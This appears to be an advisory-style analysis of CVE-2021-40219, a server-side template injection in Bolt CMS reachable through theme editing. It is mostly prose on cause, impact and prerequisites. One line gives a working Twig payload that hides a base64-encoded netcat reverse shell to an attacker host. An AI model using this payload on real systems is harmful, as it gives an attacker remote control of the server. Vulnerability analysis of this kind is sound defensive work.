Based on the provided information, here's a breakdown of the vulnerability associated with CVE-2021-40219:

**Root Cause of Vulnerability:**
- The vulnerability lies in the `TemplateController.php` file of Bolt CMS. Specifically, the `render` function at line 25 allows for the rendering of templates without proper sanitization or restrictions on the template content. This leads to a Server-Side Template Injection (SSTI) vulnerability.

**Weaknesses/Vulnerabilities Present:**
- **Server-Side Template Injection (SSTI):** The application directly uses user-controlled input (`$templateName`) to render templates, allowing an attacker to inject malicious code within the template.
- **Unsafe Rendering:** The `render` function does not sanitize or escape the template content, making it possible to execute arbitrary code.
- **Bypass of Array Restriction:** The vulnerability bypasses an array error restriction using the "join" filter which helps to execute the injected code.

**Impact of Exploitation:**
- **Remote Code Execution (RCE):** Successful exploitation of this vulnerability allows an attacker to execute arbitrary code on the server. This could lead to complete compromise of the server, data breaches, and other malicious activities.

**Attack Vectors:**
- **Remote:** The attack is performed remotely by an authenticated user.
- **Template Injection:**  The attacker injects malicious template code through a theme editing interface.

**Required Attacker Capabilities/Position:**
- **Authenticated User:** The attacker must have a valid user account with the ability to edit themes within the Bolt CMS.
- **Theme Editing Access:** The attacker requires the ability to modify theme files.
- **Template Creation/Selection:** The attacker must be able to create new templates or select existing templates to trigger the execution of the injected code.

**Technical Details:**
- The vulnerable code is in `core/src/Controller/Frontend/TemplateController.php`, specifically line 25: `return $this->render($templates, []);`
- The attacker injects a malicious payload into the template content, like the following: `{{['echo${IFS}-n${IFS}"bmMgMTAuMC4yLjE1IDQ0MyAtZSAvYmluL2Jhc2g="${IFS}|${IFS}base64${IFS}-d${IFS}|bash']|filter('system')|join(', ') }}`
- After injecting the payload, the attacker creates a page using the malicious template which triggers the execution of the code when the page is accessed.
- Version affected : BoltCMS Latest Version 4.2 ( GitHub's latest version 8/23/2021 )
